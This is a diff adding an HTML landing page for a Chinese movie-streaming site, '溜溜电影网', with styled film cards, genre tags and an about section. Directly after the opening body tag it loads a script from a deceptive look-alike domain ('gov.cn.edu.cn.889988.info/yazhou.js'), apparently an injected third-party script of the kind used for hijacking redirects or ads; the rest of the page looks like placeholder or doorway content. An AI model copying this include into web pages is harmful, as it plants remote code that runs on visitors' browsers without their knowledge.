@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>溜溜电影网 - 高清影视在线观看</title>
+    <meta name="description" content="溜溜电影网(liuliudianyingwang-app)提供最新高清电影、电视剧、综艺在线观看。畅享极致视听体验，就来溜溜电影网。">
+    <meta name="keywords" content="溜溜电影网, liuliudianyingwang-app, 高清电影, 在线观影">
+    <style>
+        /* 基础重置与变量 */
+        :root {
+            --primary: #00f2fe;
+            --secondary: #4facfe;
+            --bg-dark: #0f0c29;
+            --bg-mid: #302b63;
+            --bg-light: #24243e;
+            --text-main: #ffffff;
+            --text-muted: #a0a0d0;
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--bg-dark), var(--bg-mid), var(--bg-light));
+            color: var(--text-main);
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* 导航栏 - 毛玻璃效果 */
+        header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+            background: var(--glass-bg);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--glass-border);
+            padding: 1rem 0;
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-decoration: none;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.5rem;
+        }
+
+        .nav-links a {
+            color: var(--text-main);
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        /* 主视觉区 */
+        .hero {
+            margin-top: 80px;
+            padding: 4rem 1.5rem;
+            text-align: center;
+            min-height: 60vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(to right, #fff, var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            font-size: 1.1rem;
+            color: var(--text-muted);
+            max-width: 600px;
+            margin-bottom: 2rem;
+        }
+
+        .domain-badge {
+            display: inline-block;
+            padding: 0.5rem 1.5rem;
+            background: rgba(0, 242, 254, 0.1);
+            border: 1px solid var(--primary);
+            border-radius: 30px;
+            color: var(--primary);
+            font-weight: 600;
+            margin-bottom: 2rem;
+        }
+
+        .cta-button {
+            padding: 0.8rem 2rem;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: #000;
+            font-weight: 700;
+            border-radius: 30px;
+            text-decoration: none;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 242, 254, 0.3);
+        }
+
+        /* 通用栏目样式 */
+        .section {
+            padding: 4rem 1.5rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2rem;
+            margin-bottom: 3rem;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            display: block;
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            margin: 0.5rem auto 0;
+            border-radius: 2px;
+        }
+
+        /* 影片网格 */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .card {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            overflow: hidden;
+            transition: transform 0.3s, background 0.3s;
+            text-decoration: none;
+            color: var(--text-main);
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .card-img {
+            width: 100%;
+            height: 280px;
+            background: linear-gradient(45deg, #2a0845, #6441a5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+        }
+
+        .card-content {
+            padding: 1rem;
+        }
+
+        .card-title {
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+
+        .card-meta {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        /* 分类标签 */
+        .categories {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1rem;
+        }
+
+        .cat-tag {
+            padding: 0.8rem 1.5rem;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 10px;
+            color: var(--text-main);
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+
+        .cat-tag:hover {
+            background: var(--primary);
+            color: #000;
+            border-color: var(--primary);
+        }
+
+        /* 关于我们 */
+        .about-text {
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+            color: var(--text-muted);
+            font-size: 1.05rem;
+        }
+
+        .about-text strong {
+            color: var(--primary);
+        }
+
+        /* 页脚 */
+        footer {
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid var(--glass-border);
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-top: 2rem;
+        }
+
+        /* 移动端适配 */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none; /* 移动端简化导航 */
+            }
+            .hero h1 {
+                font-size: 2rem;
+            }
+            .grid {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            }
+            .card-img {
+                height: 200px;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+    <!-- 导航栏 -->
+    <header>
+        <div class="nav-container">
+            <a href="#" class="logo">溜溜电影网</a>
+            <nav class="nav-links">
+                <a href="#latest">最新影片</a>
+                <a href="#hot">热门推荐</a>
+                <a href="#genre">影片分类</a>
+                <a href="#about">关于我们</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- 主视觉 -->
+    <section class="hero">
+        <div class="domain-badge">官方网址: liuliudianyingwang-app</div>
+        <h1>欢迎来到溜溜电影网</h1>
+        <p>海量高清影视资源，极速播放体验。在这里发现好电影，享受每一刻的观影时光。</p>
+        <a href="#latest" class="cta-button">立即观影</a>
+    </section>
+
+    <!-- 最新影片 -->
+    <section id="latest" class="section">
+        <h2 class="section-title">最新影片</h2>
+        <div class="grid">
+            <a href="#" class="card">
+                <div class="card-img">🎬</div>
+                <div class="card-content">
+                    <div class="card-title">沙丘2：星际觉醒</div>
+                    <div class="card-meta">科幻 / 2024</div>
+                </div>
+            </a>
+            <a href="#" class="card">
+                <div class="card-img">🎬</div>
+                <div class="card-content">
+                    <div class="card-title">奥本海默</div>
+                    <div class="card-meta">传记 / 2023</div>
+                </div>
+            </a>
+            <a href="#" class="card">
+                <div class="card-img">🎬</div>
+                <div class="card-content">
+                    <div class="card-title">坠落的审判</div>
+                    <div class="card-meta">悬疑 / 2023</div>
+                </div>
+            </a>
+            <a href="#" class="card">
+                <div class="card-img">🎬</div>
+                <div class="card-content">
+                    <div class="card-title">美国小说</div>
+                    <div class="card-meta">喜剧 / 2023</div>
+                </div>
+            </a>
+        </div>
+    </section>
+
+    <!-- 热门推荐 -->
+    <section id="hot" class="section" style="background: rgba(0,0,0,0.2);">
+        <h2 class="section-title">热门推荐</h2>
+        <div class="grid">
+            <a href="#" class="card">
+                <div class="card-img">🔥</div>
+                <div class="card-content">
+                    <div class="card-title">繁花</div>
+                    <div class="card-meta">剧情 / 电视剧</div>
+                </div>
+            </a>
+            <a href="#" class="card">
+                <div class="card-img">🔥</div>
+                <div class="card-content">
+                    <div class="card-title">周处除三害</div>
+                    <div class="card-meta">动作 / 犯罪</div>
+                </div>
+            </a>
+            <a href="#" class="card">
+                <div class="card-img">🔥</div>
+                <div class="card-content">
+                    <div class="card-title">飞驰人生2</div>
+                    <div class="card-meta">喜剧 / 运动</div>
+                </div>
+            </a>
+            <a href="#" class="card">
+                <div class="card-img">🔥</div>
+                <div class="card-content">
+                    <div class="card-title">热辣滚烫</div>
+                    <div class="card-meta">剧情 / 励志</div>
+                </div>
+            </a>
+        </div>
+    </section>
+
+    <!-- 影片分类 -->
+    <section id="genre" class="section">
+        <h2 class="section-title">影片分类</h2>
+        <div class="categories">
+            <a href="#" class="cat-tag">动作片</a>
+            <a href="#" class="cat-tag">喜剧片</a>
+            <a href="#" class="cat-tag">爱情片</a>
+            <a href="#" class="cat-tag">科幻片</a>
+            <a href="#" class="cat-tag">恐怖片</a>
+            <a href="#" class="cat-tag">剧情片</a>
+            <a href="#" class="cat-tag">动画片</a>
+            <a href="#" class="cat-tag">纪录片</a>
+            <a href="#" class="cat-tag">国产剧</a>
+            <a href="#" class="cat-tag">欧美剧</a>
+            <a href="#" class="cat-tag">综艺节目</a>
+        </div>
+    </section>
+
+    <!-- 关于我们 -->
+    <section id="about" class="section" style="background: rgba(0,0,0,0.2);">
+        <h2 class="section-title">关于溜溜电影网</h2>
+        <div class="about-text">
+            <p><strong>溜溜电影网 (liuliudianyingwang-app)</strong> 致力于为广大影迷提供最优质的在线观影服务。我们拥有海量高清影视资源库，涵盖电影、电视剧、综艺、动漫等多种类型。</p>
+            <br>
+            <p>网站采用先进的流媒体技术，确保播放流畅不卡顿。界面设计简洁易用，让您轻松找到想看的影片。无论您身在何处，都能随时随地享受极致的视听盛宴。</p>
+        </div>
+    </section>
+
+    <!-- 页脚 -->
+    <footer>
+        <p>© 2024 溜溜电影网 (liuliudianyingwang-app). All Rights Reserved.</p>
+        <p style="margin-top: 0.5rem; font-size: 0.8rem;">免责声明：本站仅提供影视信息展示，所有资源均来自互联网，如有侵权请联系删除。</p>
+    </footer>
+
+</body>
+</html>
